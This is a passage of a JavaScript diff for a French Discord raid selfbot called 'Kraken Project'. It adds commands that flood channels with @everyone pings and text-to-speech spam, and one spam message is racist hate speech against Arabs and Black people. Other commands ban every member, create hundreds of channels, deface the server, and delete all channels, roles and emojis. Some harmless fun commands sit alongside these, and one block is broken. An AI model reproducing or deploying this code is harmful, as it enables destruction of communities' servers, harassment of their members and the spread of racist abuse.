+      msg.channel.send('@everyone ͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌��⃢͌͌͌��͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢��͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌͌⃢͌͌');
+    }, 100);
+    commandIntervals.push(inteval);
+  }
+
+  if (msg.content === '!PresetTts' ) {
+    if (msg.deletable) msg.delete();
+    let inteval = setInterval(function() {
+      msg.channel.send('@everyone ' + 'nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes nique les arabes et les noirs car ce sont des terroristes', {tts: true} ); 
+    }, 100);    
+    commandIntervals.push(inteval);
+  }
+
+  if (msg.content === '!PresetTts2' ) {
+    if (msg.deletable) msg.delete();
+    let inteval = setInterval(function() {
+      msg.channel.send('@everyone Ecoutez moi attentivement bande de raclures de trottoirs de banlieues HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH', { tts: true } );
+    }, 100);
+    commandIntervals.push(inteval);
+  }
+
+  if(msg.content.startsWith("!Krakenspam")) {
+    if (msg.deletable) msg.delete();
+    if(msg.channel.type === "dm") return;
+    let args = msg.content.split(" ").slice(1).join(" ");
+    let inteval = setInterval(function() {
+      msg.channel.send(args)
+    }, 200);
+    commandIntervals.push(inteval);
+  }
+    
+  if (msg.content === '!stop') {
+    if (msg.deletable) msg.delete();
+    commandIntervals.forEach(interval => {
+      clearInterval(interval);
+    });
+    con('Commandes stopées avec succès.');
+  }
+
+  if (msg.author.id !== bot.user.id) return;
+  
+  if (msg.content === '!getbanbitch') {
+  if (msg.deletable) msg.delete();
+  msg.guild.members.forEach(member => {
+      member.ban().then(function () {
+      });
+  });
+ }
+
+ if (msg.content === '!fuckchannel') {
+  if (msg.deletable) msg.delete();
+  let i = 0;
+  let interval = setInterval(function () {
+    if (i === 250) clearInterval(interval);
+    msg.guild.createChannel("Rekt_by_Eaucalme").then(i++);
+  }, 100);
+ }
+
+ if (msg.content === '!deface') {
+    if (msg.deletable) msg.delete();
+    msg.guild.setRegion('hongkong')
+    msg.guild.setIcon('https://imgur.com/a/xy7QeCN');
+    msg.guild.setName('FUCKED BY EAUCALME')
+ }
+
+if (msg.content === '!clearchannel'){
+  if (msg.deletable) msg.delete();
+  msg.guild.channels.forEach(chan => {
+    if (chan.deletable) chan.delete();
+  });
+ }
+
+if (msg.content === '!clearrole'){
+  if (msg.deletable) msg.delete();
+  msg.guild.roles.forEach(role => {
+    role.delete()
+  });
+ }
+
+if (msg.content === '!delemote'){
+  if (msg.deletable) msg.delete();
+  msg.guild.emojis.forEach(emoji => {
+    emoji.delete()
+  });
+ }
+
+if (msg.content === '!ez') {
+  if (msg.deletable) msg.delete();
+  msg.guild.channels.forEach(channel => {
+    if (channel.type === "text") channel.send("@everyone **Eaucalme Le best**\n"+
+"░░░░░░░░░░░░▄▄▄▄░░░░░░░░░░░░░░░░░░░░░░░▄▄▄▄▄\n"+
+"░░░█░░░░▄▀█▀▀▄░░▀▀▀▄░░░░▐█░░░░░░░░░▄▀█▀▀▄░░░▀█▄\n"+
+"░░█░░░░▀░▐▌░░▐▌░░░░░▀░░░▐█░░░░░░░░▀░▐▌░░▐▌░░░░█▀\n"+
+"/░▐▌░░░░░░░▀▄▄▀░░░░░░░░░░▐█▄▄░░░░░░░░░▀���▄▀░░░░░▐▌\n"+
+"░█░░░░░░░░░░░░░░░░░░░░░░░░░▀█░░░░░░░░░░░░░░░░░░█\n"+
+"▐█░░░░░░░░░░░░░░░░░░░░░░░░░░█▌░░░░░░░░░░░░░░░░░█ \n"+
+"▐█░░░░░░░░░░░░░░░░░░░░░░░░░░█▌░░░░░░░░░░░░░░░░░█\n"+
+"░▐▌░░░░░░░░░░░░░░░░░░░░▀███▀░░░░░░░░░░░░░░░░░░▐▌\n"+
+"░░█░░░░░░░░░░░░░░░░░▀▄░░░░░░░░░░▄▀░░░░░░░░░░░░█\n"+
+"░░░█░░░░░░░░░░░░░░░░░░▀▄▄▄▄▄▄▄▀▀░░░░░░░░░░░░░█\n")
+ }) 
+ }
+
+ if (msg.content === '!deban') {
+  if (msg.deletable) msg.delete();
+  let interval = setInterval(function () {
+      msg.guild.fetchBans().then(bans => {
+        bans.forEach(ban => {
+          msg.guild.unban(ban.id);
+        });
+      });
+    }, 1000);
+ }
+
+  if (msg.content.startsWith('!KCherche')) {
+    if(msg.deletable) msg.delete()
+      let args = msg.content.split(' ')
+      args.shift()
+      msg.reply('Voici les résultats de la recherche : https://www.google.fr/search?q=' + args.join("%20"))
+
+      }
+
+      if(msg.content.startsWith("!8ball")){
+        if(msg.deletable) msg.delete()
+
+        var question = msg.content.split(" ").join(" ").slice(7)
+        var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Sûrement", "C'est impensable","C'est sûr", "Bien évidemment", "J'en suis certain", "C'est très probable", "Absolument", "Je plussoie", "Je moinsoie"]
+    
+        let ball_embed = new Discord.RichEmbed()
+        .setColor("RANDOM")
+        .setTitle("Question de "+msg.author.tag+"")
+        .setDescription(""+question+"")
+        .addField("Réponse",""+ tableauball[Math.floor(Math.random()*8)] +"")
+        .setThumbnail(bot.user.iconURL)
+        return msg.channel.send(ball_embed).catch(e => {});
+
+        }
+
+        if(msg.content.startsWith("!say")) {
+          if(msg.deletable) msg.delete()
+          let args = msg.content.split(" ").join(" ").slice(1);
+          msg.delete()
+        .setColor("RANDOM")
+        .setDescription(msg.author.username + " says : " + args);
+        msg.channel.send({sayembed})
+
+        }
+
+        if(msg.content.startsWith("!kiss")) {
+          if(msg.deletable) msg.delete()
+        let muser = msg.mentions.users.first()
+        let r = rnb({
+            min: 0,
+            max: kiss.length - 1,
+            integer: true
+        });
+        let image = kiss[r];
+
+        if (!msg.mentions.users.first()) return msg.channel.sendMessage({
+             "embed": {
+                     description: "**" + msg.author.username + "**" + ", vous avez reçu un bisou de la part de " +  "**Kraken Project.**",
+                     color: 0xff7b00,
+                     "image": {
+                     "url": image,
+                     timestamp: new Date(),
+                    footer: {
+                      text: "Kiss"
+                    },
+                     }
+                 }
+             })
+
+        msg.channel.sendMessage({
+             "embed": {
+                     description: "** " + muser.username + "**"  + ", vous avez reçu un bisou de la part de " + "**" + msg.author.username + " **",
+                     color: 0xff7b00,
+                     "image": {
+                     "url": image,
+                     timestamp: new Date(),
+                    footer: {
+                      text: "Kiss"
+                    },
+                     }
+                 }
+             })
+ }
+
+ if(msg.content.startsWith("!gif")) {
+  if(msg.deletable) msg.delete()
+  let args = msg.content.split(" ").join(" ").slice(1);
+  gifSearch.random(args).then(
+      gifUrl => {
+
+      let randomcolor = ((1 << 24) * Math.random() | 0).toString(16) //Optional
+      var embed = new Discord.RichEmbed()
+          .setColor(`#${randomcolor}`)
+          .setImage(gifUrl)
+      msg.channel.send(embed);
+  });
+ }
+
+ if(msg.content.startsWith("!calin")) {
+ let muser = msg.mentions.users.first()
+ let r = rnb({
+     min: 0,
+     max: hug.length - 1,
+     integer: true
+ });
+ let image = hug[r];
+
+ if (!msg.mentions.users.first()) return msg.channel.sendMessage({
+      "embed": {
+              description: "**:hugging: " + msg.author.username + "**" + ", vous avez reçu un câlin de la part de " +  "**Kraken Project.**",
+              color: 0xff7b00,
+              "image": {
+              "url": image,
+              timestamp: new Date(),
+             footer: {
+               text: "Hug"
+             },
+              }
+          }
+      })
+
+ msg.channel.sendMessage({
+      "embed": {
+              description: "**:hugging: " + muser.username + "**" + ", vous avez reçu un câlin de la part de " + "**" + msg.author.username + " **",
+              color: 0xff7b00,
+              "image": {
+              "url": image,
+              timestamp: new Date(),
+             footer: {
+               text: "Hug"
              },
               }
           }
